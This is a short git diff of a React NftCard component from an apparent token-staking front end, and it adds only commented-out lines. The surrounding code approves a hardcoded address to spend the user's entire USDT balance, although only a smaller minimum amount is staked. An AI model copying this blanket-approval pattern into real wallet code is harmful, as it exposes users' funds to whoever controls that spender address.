@@ -88,6 +88,8 @@ const NftCard = ({
     // setstakeLoading(true);
     const approvalAmount = onChainBalance / decimals;
     const firstCall = await usdt.approve(
+      // "0xDb339BE8E04dB248ea2Bdd7C308C5589C121C68b",
+
       "0x88a94055AB22Ac80306cc0f00bb13c85205afd3d",
       approvalAmount,
       {
@@ -99,12 +101,15 @@ const NftCard = ({
 
     const minValue = parseFloat(minPrice) * decimals;
     // const minValue = parseFloat(minPrice) * 1000000000000000000
-    
+    // const minValue = parseFloat(minPrice) * 1000;
+
     const percentValue = percentage * 100;
 
     console.log(minValue, percentValue);
 
     const secondCall = await staking.stakeTokens(minValue, percentValue, {
+
+      //gasLimit: 30000,
       gasLimit: 30000,
     });
     console.log(secondCall);
